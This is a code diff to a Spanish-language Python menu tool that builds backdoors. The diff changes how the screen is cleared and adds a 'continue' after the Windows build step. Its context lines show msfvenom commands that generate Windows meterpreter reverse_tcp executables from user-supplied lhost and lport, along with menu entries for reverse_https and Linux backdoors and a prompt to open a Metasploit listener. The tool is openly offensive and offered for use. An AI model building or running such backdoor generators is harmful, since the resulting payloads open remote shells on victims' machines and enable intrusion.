@@ -55,7 +55,7 @@ while True:
     print("7 - Salir\n")
     opcion= input("Selecciona una opción: ")
     if opcion == "1":
-        os.system('clear')
+        os.system('cls' if os.name == 'nt' else 'clear')
         print("\n1 - Backdoor-Windows con meterpreter (reverse_tcp) *Recomendado*")
         print("2 - Backdoor-Windows con meterpreter (reverse_https)")
         print("3 - Backdoor-Linux con meterpreter (reverse_tcp)")
@@ -74,6 +74,7 @@ while True:
             print("\nCreando exploit...")
             if os.name == "nt":
                 os.system("cd C:\metasploit && msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
+                continue
             else:
                 os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
                 salir = input("Desea abrir el listener de metasploit? (s/n): ")
